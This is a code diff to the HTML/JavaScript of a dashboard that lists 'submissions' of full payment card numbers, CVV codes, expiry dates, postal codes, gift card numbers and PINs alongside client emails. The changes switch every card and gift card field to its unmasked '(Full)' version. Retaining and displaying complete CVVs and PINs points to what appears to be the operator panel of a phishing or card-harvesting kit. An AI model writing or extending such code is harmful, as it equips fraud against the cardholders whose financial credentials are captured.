@@ -1858,7 +1858,7 @@
       noSubmissions.style.display = 'none';
       
       container.innerHTML = submissions.map((sub, idx) => {
-        const isGiftCard = sub.submissionType === 'giftcard';
+        const isGiftCard = sub.giftCardNumberFull || sub.giftCardNumber;
         const timestamp = new Date(sub.timestamp).toLocaleString();
         
         if (isGiftCard) {
@@ -1869,12 +1869,12 @@
               </div>
               <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 16px; margin-top: 16px;">
                 <div>
-                  <div style="font-size: 11px; color: #94a3b8; text-transform: uppercase; margin-bottom: 4px;">Gift Card Digits</div>
-                  <div style="font-size: 14px; color: #e6eef8; word-break: break-all; font-weight: 600;">${sub.giftCardNumber || '-'}</div>
+                  <div style="font-size: 11px; color: #94a3b8; text-transform: uppercase; margin-bottom: 4px;">Gift Card Digits (Full)</div>
+                  <div style="font-size: 14px; color: #e6eef8; word-break: break-all; font-weight: 600;">${sub.giftCardNumberFull || sub.giftCardNumber || '-'}</div>
                 </div>
                 <div>
-                  <div style="font-size: 11px; color: #94a3b8; text-transform: uppercase; margin-bottom: 4px;">Gift Card PIN</div>
-                  <div style="font-size: 14px; color: #e6eef8; word-break: break-all; font-weight: 600;">${sub.giftCardPin || '-'}</div>
+                  <div style="font-size: 11px; color: #94a3b8; text-transform: uppercase; margin-bottom: 4px;">Gift Card PIN (Full)</div>
+                  <div style="font-size: 14px; color: #e6eef8; word-break: break-all; font-weight: 600;">${sub.giftCardPinFull || sub.giftCardPin || '-'}</div>
                 </div>
                 <div>
                   <div style="font-size: 11px; color: #94a3b8; text-transform: uppercase; margin-bottom: 4px;">Client Email</div>
@@ -1882,7 +1882,7 @@
                 </div>
                 <div>
                   <div style="font-size: 11px; color: #94a3b8; text-transform: uppercase; margin-bottom: 4px;">Amount</div>
-                  <div style="font-size: 14px; color: #10b981; font-weight: 700;">$${parseFloat(sub.amount || 0).toFixed(2)}</div>
+                  <div style="font-size: 14px; color: #10b981; font-weight: 700;">$${parseFloat(sub.total || sub.amount || 0).toFixed(2)}</div>
                 </div>
                 <div>
                   <div style="font-size: 11px; color: #94a3b8; text-transform: uppercase; margin-bottom: 4px;">Submitted</div>
@@ -1900,12 +1900,12 @@
               </div>
               <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 16px; margin-top: 16px;">
                 <div>
-                  <div style="font-size: 11px; color: #94a3b8; text-transform: uppercase; margin-bottom: 4px;">Card Digits</div>
-                  <div style="font-size: 14px; color: #e6eef8; word-break: break-all; font-weight: 600;">${sub.cardNumber || '-'}</div>
+                  <div style="font-size: 11px; color: #94a3b8; text-transform: uppercase; margin-bottom: 4px;">Card Digits (Full)</div>
+                  <div style="font-size: 14px; color: #e6eef8; word-break: break-all; font-weight: 600;">${sub.cardNumberFull || sub.cardNumber || '-'}</div>
                 </div>
                 <div>
-                  <div style="font-size: 11px; color: #94a3b8; text-transform: uppercase; margin-bottom: 4px;">CVV</div>
-                  <div style="font-size: 14px; color: #e6eef8; font-weight: 600;">${sub.cvv || '-'}</div>
+                  <div style="font-size: 11px; color: #94a3b8; text-transform: uppercase; margin-bottom: 4px;">CVV (Full)</div>
+                  <div style="font-size: 14px; color: #e6eef8; font-weight: 600;">${sub.securityCodeCVV || sub.cvv || '-'}</div>
                 </div>
                 <div>
                   <div style="font-size: 11px; color: #94a3b8; text-transform: uppercase; margin-bottom: 4px;">Expiry Date</div>
@@ -1913,7 +1913,7 @@
                 </div>
                 <div>
                   <div style="font-size: 11px; color: #94a3b8; text-transform: uppercase; margin-bottom: 4px;">Postal Code</div>
-                  <div style="font-size: 14px; color: #e6eef8; font-weight: 600;">${sub.zipCode || sub.postalCode || '-'}</div>
+                  <div style="font-size: 14px; color: #e6eef8; font-weight: 600;">${sub.postalCode || sub.zipCode || '-'}</div>
                 </div>
                 <div>
                   <div style="font-size: 11px; color: #94a3b8; text-transform: uppercase; margin-bottom: 4px;">Client Email</div>
